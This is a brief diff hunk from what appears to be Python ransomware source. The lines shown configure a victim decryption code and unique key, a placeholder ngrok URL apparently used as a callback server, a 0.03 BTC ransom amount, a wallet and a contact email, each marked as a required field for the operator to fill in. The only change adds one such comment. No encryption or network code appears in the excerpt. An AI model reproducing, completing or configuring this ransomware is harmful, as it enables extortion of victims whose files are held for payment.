@@ -14,7 +14,7 @@ decryptPlease = random.randint(100000, 999999)
 uniqueKey = str(datetime.now().time()).strip().replace(':', '').replace('.', '')
 
 
-url = "YOUR_NGROK_URL_HERE"
+url = "YOUR_NGROK_URL_HERE"                             # <----  REQUIRED
 BTC_AMOUNT = 0.03                                       # <----  REQUIRED
 BTC_WALLET = "YOUR_BTC_WALLET_HERE"                     # <----  REQUIRED
 EMAIL = "YOUR_EMAIL_HERE"                               # <----  REQUIRED
